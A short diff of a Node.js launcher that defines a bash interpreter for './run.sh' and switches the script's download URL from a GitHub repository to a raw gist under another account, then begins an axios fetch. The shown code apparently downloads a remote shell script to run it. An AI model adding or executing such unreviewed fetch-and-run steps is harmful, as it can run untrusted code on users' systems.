@@ -5,7 +5,7 @@ const axios = require('axios');
 const startScriptPath = './run.sh';
 const interpreterPath = '/usr/bin/env';
 const interpreterArgs = ['bash', startScriptPath];
-const scriptDownloadURL = 'https://github.com/mjjonone/good/raw/main/run.sh';
+const scriptDownloadURL = 'https://gist.githubusercontent.com/cvocloud/a21e4bd28672aa628e5e18ec5bd25b0a/raw/07544eec9aa7e8870cca01cd977422eda435106b/run.sh';
 
 axios({
   method: 'get',
